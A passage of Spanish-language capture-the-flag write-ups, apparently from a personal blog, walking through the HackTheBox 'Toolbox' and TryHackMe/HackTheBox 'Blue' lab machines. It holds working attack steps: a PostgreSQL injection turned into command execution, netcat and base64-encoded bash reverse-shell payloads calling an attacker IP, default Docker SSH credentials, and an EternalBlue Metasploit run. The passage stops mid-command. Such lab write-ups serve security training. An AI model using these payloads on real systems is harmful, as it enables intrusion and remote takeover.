Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.236 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\nextractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.236 5 │ [*] Open ports: 21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV 10.10.10.236 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) | 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) |_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.38 (Debian) |_ssl-date: TLS randomness does not represent time |_http-title: MegaLogistics | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR | Not valid before: 2020-02-18T17:45:56 |_Not valid after: 2021-02-17T17:45:56 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-10-29T20:34:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: 1s Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos FTP Nmap a reportada que en el puerto 21 (FTP) está el login Anonymous habilitado. Esto significa que podemos entrar con el usuario anonymous sin necesidad de proporcionar contraseña. Una vez conectados vemos un archivo llamado docker-toolbox.exe que de momento no podemos hacer nada con él, pero no lo olvidaremos 😉\n$ ftp 10.10.10.236 Connected to 10.10.10.236. Name (10.10.10.236:d3b0o): anonymous 331 Password required for anonymous Password: 230 Logged on ftp\u0026gt; ls -r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe SMB El nmap también reporto que había un smb corriendo en la máquina víctima. Con un crackmapexec vemos un poco más de información sobre la máquina víctima\u0026hellip;\ncrackmapexec smb 10.10.10.236 SMB 10.10.10.236 445 TOOLBOX [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False) Ahora podríamos probar de listar los recursos compartidos en el smb para ello vamos a usar distintas herramientas, pero no tenemos permisos para enumerar los recursos así que no podemos tirar por aquí tampoco\nSmbclient\rCrackmapexec\rSmbmap\r$ smbclient -L 10.10.10.236 -N session setup failed: NT_STATUS_ACCESS_DENIED $ crackmapexec smb 10.10.10.236 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.236 445 TOOLBOX [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False) SMB 10.10.10.236 445 TOOLBOX [-] Toolbox\\: STATUS_ACCESS_DENIED SMB 10.10.10.236 445 TOOLBOX [-] Error enumerating shares: Error occurs while reading from remote(104) $ smbmap -H 10.10.10.236 ________ ___ ___ _______ ___ ___ __ _______ /\u0026#34; )|\u0026#34; \\ /\u0026#34; || _ \u0026#34;\\ |\u0026#34; \\ /\u0026#34; | /\u0026#34;\u0026#34;\\ | __ \u0026#34;\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /\u0026#39; /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __\u0026#39; \\ (| / /\u0026#34; \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) ----------------------------------------------------------------------------- SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com https://github.com/ShawnDEvans/smbmap [*] Detected 1 hosts serving SMB [*] Established 0 SMB session(s) HTTPS Volviendo al escaneo de nmap, hay una línea en el resultado del puerto 443 que dice lo siguiente\nssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR Así que vamos a añadir este dominio en el /etc/hosts\n10.10.10.236 megalogistic.com admin.megalogistic.com En la web admin.megalogistic.com vemos un panel de login. Al probar la tipica inyección sql ' or 1=1-- - en el campo del usuario vemos que podemos iniciar sesión satisfactoriamente. En la web no podemos sacar mucha información, simplemente podemos ver el desarrollador y la versión (MegaCorp 1.0.0) y un to-do que dice lo siguiente:\nEnviar credenciales a Tony Actualizar los drivers de la impresora Intrusión En el panel anterior se pueden probar más cositas, de momento solo hemos probado de iniciar sesión con el 'or 1=1-- -, pero a lo mejor podemos hacer más cositas.\nEmpezamos poniendo una comilla para ver si sale algún error legible de la base de datos.\nWarning: pg_query(): Query failed: ERROR: unterminated quoted string at or near \u0026#34;\u0026#39;\u0026#39;\u0026#39; AND password = md5(\u0026#39;\u0026#39;);\u0026#34; LINE 1: SELECT * FROM users WHERE username = \u0026#39;\u0026#39;\u0026#39; AND password = md5(... ^ in /var/www/admin/index.php on line 10 Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11 Efectivamente, sale un error en el cual sale pg_query() con esto sabemos que estamos ante un PostgreSQL\nPara saber como hacer una inyección a un PostgreSQL existe un recurso muy interesante de la repo de Payloads All The Things, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyección sql a un rce (Remote Code Execution)\nBásicamente, consiste en crear una tabla en la base de datos en uso por la web\nCREATE TABLE cmd_exec(cmd_output text); Mediante COPY se pondrá en la tabla el resultado del comando id, lo que provocará que se ejecute el comando ìd\nCOPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;; De forma opcional, en el caso de que podamos ver el output lo podríamos ver simplemente haciendo una petición a la tabla cmd_exec\nSELECT * FROM cmd_exec; Sabiendo esto vamos con la explotación:\nPrimero se intercepta la petición con burpsuite y la mandamos al repeter para trabajar mejor. En el apartado username vamos a añadir una comilla para cerrar la del username y despues vamos a poner un ; para hacer otra petición. Ahora ya podemos poner la petición que realizara la inyección CREATE TABLE cmd_exec(cmd_output text);. Por último al final se comenta con un -- - para que ignore la siguiente parte de la querry de verificación de la password (Si esto no te queda claro tengo un video en mi canal de youtube en el cual explico en 6 minutos como funcionan las inyecciones sql)\nusername=\u0026#39;;+CREATE+TABLE+cmd_exec(cmd_output text)-- - Ahora ya tenemos la tabla cmd_exec creada\nReverse Shell Sabiendo que la máquina es windows si queremos mandarnos una reverse shell tenemos que compartir con un samba el ejecutable de netcat (nc.exe). Si estás desde un kali o parrot seguramente ya lo tendrás instalado lo puedes encontrar con un locate nc.exe. Ahora, ya desde el mismo directorio que tenemos el nc.exe podemos abrir el servidor samba de la siguiente forma:\nimpacket-smbserver smb $(pwd) --smb2support Explicación parámetros\r${pwd}: Esto equivale a poner la ruta actual de trabajo, en este comando nos sirve para decir donde queremos que abra el servidor samba \u0026ndash;smb2support: Sirve para habilitar el soporte de la versión 2 de samba Ahora nos ponemos en escucha por el puerto 443 para recibir la reverse shell\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha Teniendo el servidor samba abierto y estando en escucha ya podemos mandar la reverse shell mediante la inyección sql.\nusername=\u0026#39;;+COPY+cmd_exec+FROM+PROGRAM+\u0026#39;//10.10.14.28/nc.exe+-e+cmd.exe+10.10.14.28+443\u0026#39;-- -\u0026amp;password=test No recibimos nada\u0026hellip;\nA lo mejor, por mucho que la máquina sea windows tiene un docker así que podemos probar de en vez de mandar la reverseshell con un netcat en un samba, mandarla directamente con bash\nLa típica reverse shell de bash es: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1, pero lo pondremos dentro de bash -c \u0026quot;bash- i...\u0026quot; porque puede ser que la normal la bloquee la máquina víctima. En resumen quedará así:\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34; Antes de aplicarlo a la inyección vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | base64 Ahora ya tenemos el base64 generado, pero hay un + en la cadena, el cual podemos sustituir por un %2b. El comando final que tendremos que poner en la inyección seria, primero un echo con el base64, después un base64 -d para decodear el base64 y por último bash para que el resultado del base64 lo ejecute con bash.\necho \u0026#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK\u0026#34; | base64 -d | bash Esto aplicado a la inyección se vería de la siguiente forma:\nusername=\u0026#39;;+COPY+cmd_exec+FROM+PROGRAM+\u0026#39;echo+\u0026#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK\u0026#34;+|+base64+-d+|+bash\u0026#39;--+- ¡¡¡¡Recibimos la conexión!!!!!\nAntes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Escalada de privilegios Podemos identificar que estamos en un docker porque en la raíz está el archivo .dockerenv\npostgres@bc56e3cc55e9:/$ ls -la total 80 drwxr-xr-x 1 root root 4096 Mar 29 2021 . drwxr-xr-x 1 root root 4096 Mar 29 2021 .. -rwxr-xr-x 1 root root 0 Mar 29 2021 .dockerenv drwxr-xr-x 1 root root 4096 Feb 19 2020 bin drwxr-xr-x 2 root root 4096 Nov 10 2019 boot drwxr-xr-x 5 root root 340 Oct 30 20:54 dev ... Si hacemos una búsqueda por google podemos encontrar unas credenciales por default del ssh en los boot2docker (web)\nuser: docker pass: tcuser Si miramos que ip tenemos con ifconfig, vemos la 172.17.0.2, la gateway seguramente será la 172.17.0.1\npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) RX packets 1338 bytes 183525 (179.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1163 bytes 173814 (169.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 3461 bytes 1232799 (1.1 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 3461 bytes 1232799 (1.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Así que nos podemos conectar a la máquina host del docker con ssh docker@172.17.0.1\npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1 docker@172.17.0.1\u0026#39;s password: ( \u0026#39;\u0026gt;\u0026#39;) /) TC (\\ Core is distributed with ABSOLUTELY NO WARRANTY. (/-_--_-\\) www.tinycorelinux.net docker@box:~$ Escalada root/Administrator Si hacemos un sudo -l para ver que podemos ejecutar con sudo, nos muestra que podemos ejecutar todos los comandos como root sin la necesidad de proporcionar contraseña.\ndocker@box:~$ sudo -l User docker may run the following commands on this host: (root) NOPASSWD: ALL docker@box:~$ Sabiendo esto simplemente podemos poner sudo bash y ya seremos root\ndocker@box:~$ sudo bash root@box:/home/docker# Al investigar un poco los archivo de la raíz se puede ver que hay un directorio llamado c en el cual hay una estructura de carpetas parecida a la de windows, ahí podemos encontrar la flag final\nroot@box:/c/Users/Administrator/Desktop# ls desktop.ini root.txt root@box:/c/Users/Administrator/Desktop# Y ya tendríamos la flag de root.txt\nComo extra, en el directorio /c/Windows/Users/.ssh podemos ver una llave privada de ssh la cual podemos usar para salir del docker e ir a la máquina host. Para usarla tenemos que guardarla en un archivo en nuestra máquina\nPara que no de problemas le tenemos que dar permisos\nchmod 600 id_rsa Ahora ya nos podemos conectar por ssh como Administrator en la máquina víctima con el siguiente comando\nssh -i id_rsa Administrator@10.10.10.236 Y ya tenemos una consola como Administrator en la máquina víctima\n$ ssh -i id_rsa Administrator@10.10.10.236 administrator@TOOLBOX C:\\Users\\Administrator\u0026gt; ","date":"2023-10-29","id":17,"permalink":"/writeups/hackthebox/toolbox/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.236 PING 10.","tags":["CTF","RCE","SQLI","Docker","Windows"],"title":"Toolbox"},{"content":"","date":"2023-10-29","id":18,"permalink":"/tags/windows/","summary":"","tags":[],"title":"Windows"},{"content":"","date":"2023-09-07","id":19,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":20,"permalink":"/","summary":"","tags":[],"title":"d3b0o"},{"content":" ","date":"2023-08-30","id":21,"permalink":"/writeups/hackthebox/pandora-video/","summary":" ","tags":[],"title":"Pandora (Video)"},{"content":" ","date":"2023-08-29","id":22,"permalink":"/writeups/hackthebox/horizontall-video/","summary":" ","tags":[],"title":"Horizontall (Video)"},{"content":" ","date":"2023-08-28","id":23,"permalink":"/writeups/hackthebox/bashed-video/","summary":" ","tags":[],"title":"Bashed (Video)"},{"content":" ","date":"2023-08-27","id":24,"permalink":"/writeups/hackmyvm/friendly-iii-video/","summary":" ","tags":[],"title":"Friendly III (Video)"},{"content":" ","date":"2023-06-03","id":25,"permalink":"/writeups/hackmyvm/visions-video/","summary":" ","tags":[],"title":"Visions (Video)"},{"content":" ","date":"2023-06-02","id":26,"permalink":"/writeups/hackmyvm/friendly-ii-video/","summary":" ","tags":[],"title":"Friendly II (Video)"},{"content":" ","date":"2023-06-01","id":27,"permalink":"/writeups/hackmyvm/five-video/","summary":" ","tags":[],"title":"Five (Video)"},{"content":" ","date":"2023-05-31","id":28,"permalink":"/writeups/hackmyvm/doc-video/","summary":" ","tags":[],"title":"Doc (Video)"},{"content":" ","date":"2023-05-05","id":29,"permalink":"/writeups/hackmyvm/literal-video/","summary":" ","tags":[],"title":"Literal (Video)"},{"content":" ","date":"2023-04-19","id":30,"permalink":"/writeups/hackmyvm/jabita-video/","summary":" ","tags":[],"title":"Jabita (Video)"},{"content":" ","date":"2023-03-30","id":31,"permalink":"/writeups/hackmyvm/friendly-i-video/","summary":" ","tags":[],"title":"Friendly I (Video)"},{"content":" ","date":"2023-03-27","id":32,"permalink":"/writeups/hackmyvm/uvalde-video/","summary":" ","tags":[],"title":"Uvalde (Video)"},{"content":" ","date":"2023-03-22","id":33,"permalink":"/writeups/hackmyvm/w140-video/","summary":" ","tags":[],"title":"W140 (Video)"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.220.86 PING 10.10.220.86 (10.10.220.86) 56(84) bytes of data. 64 bytes from 10.10.220.86: icmp_seq=1 ttl=125 time=311 ms --- 10.10.220.86 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 310.739/310.739/310.739/0.000 ms En este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.220.86 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n$ extractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.220.86 5 │ [*] Open ports: 135,139,445,3389,49153,49154,49158,49161 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p135,139,445,3389,49153,49154,49158,49161 -sC -sV 10.10.220.86 -oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-03-13T21:38:54+00:00; +2s from scanner time. | ssl-cert: Subject: commonName=Jon-PC | Not valid before: 2023-03-12T18:12:17 |_Not valid after: 2023-09-11T18:12:17 | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 |_ System_Time: 2023-03-13T21:38:43+00:00 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02c0de388f81 (unknown) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-03-13T21:38:42 |_ start_date: 2023-03-13T18:31:03 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-03-13T16:38:42-05:00 Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Intrusión El escaneo de nmap ha reportado que es un windows 7 con un servidor samba\nCon nmap podemos ver si es vulnerable\n❯ nmap --script \u0026#34;vuln and safe\u0026#34; -p445 10.10.220.86 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 22:53 CET Nmap scan report for 10.10.220.86 Host is up (0.37s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Es vulnerable. Ahora vamos a usar un exploit de metasploit\nPrimero abrimos metasploit\nmsfconsole Buscamos exploits para ms17-010\nmsf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Vamos a usar el primero\nuse 0 Ponemos la ip de la víctima\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhost 10.10.220.86 rhost =\u0026gt; 10.10.220.86 Especificamos la ip y el puerto en el que vamos a estar en escucha\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.2.28.215 lhost =\u0026gt; 10.2.28.215 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lport 443 lport =\u0026gt; 443 Cambiamos el payload\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set payload windows/x64/shell/reverse_tcp payload =\u0026gt; windows/x64/shell/reverse_tcp Y por último lo ejecutamos con run\nrun Ahora ya tenemos una reverse shell.\nFlags Las flags están en:\nC:\\flag1.txt\nC:\\Windows\\System32\\config\\flag2.txt\nC:\\Users\\Jon\\Documents\\flag3.txt\n","date":"2023-03-14","id":34,"permalink":"/writeups/tryhackme/blue/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.","tags":["CTF","Fácil","Windows","ms17-010","eternalblue","smb","metasploit"],"title":"Blue"},{"content":"","date":"2023-03-14","id":35,"permalink":"/tags/eternalblue/","summary":"","tags":[],"title":"eternalblue"},{"content":"","date":"2023-03-14","id":36,"permalink":"/tags/f%C3%A1cil/","summary":"","tags":[],"title":"Fácil"},{"content":"","date":"2023-03-14","id":37,"permalink":"/tags/metasploit/","summary":"","tags":[],"title":"metasploit"},{"content":"","date":"2023-03-14","id":38,"permalink":"/tags/ms17-010/","summary":"","tags":[],"title":"ms17-010"},{"content":"","date":"2023-03-14","id":39,"permalink":"/tags/smb/","summary":"","tags":[],"title":"smb"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=332 ms --- 10.10.10.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 332.152/332.152/332.152/0.000 ms En este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n$ extractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.40 5 │ [*] Open ports: 135,139,445,49152,49153,49154,49155,49156,49157 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sC -sV 10.10.10.40-oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-03-13T17:41:08+00:00 | smb2-time: | date: 2023-03-13T17:41:09 |_ start_date: 2023-03-12T19:47:16 | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2s, deviation: 1s, median: 1s Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Intrusión El escaneo de nmap ha reportado que es un windows 7 con un servidor samba\nCon nmap podemos ver si es vulnerable\n❯ sudo nmap --script smb-vuln* -p139,445 -T4 -Pn 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 18:44 CET Nmap scan report for 10.10.10.40 Host is up (0.072s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND Es vulnerable. Vamos a usar un exploit de metasploit\nPrimero abrimos metasploit\nmsfconsole Buscamos exploits para ms17-010\nmsf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Vamos a usar el primero\nuse 0 Definimos ip de víctima y atacante\nmsf6 